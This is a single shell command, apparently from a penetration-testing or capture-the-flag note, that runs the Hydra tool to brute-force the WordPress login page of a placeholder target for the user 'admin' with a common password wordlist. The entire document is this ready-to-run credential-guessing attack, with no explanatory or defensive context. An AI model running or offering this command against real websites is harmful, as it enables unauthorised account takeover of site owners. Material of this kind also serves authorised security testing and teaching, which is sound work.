```
hydra -l admin  -P /opt/seclists/Passwords/probable-v2-top1575.txt  TARGET -V http-form-post '/wp/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```
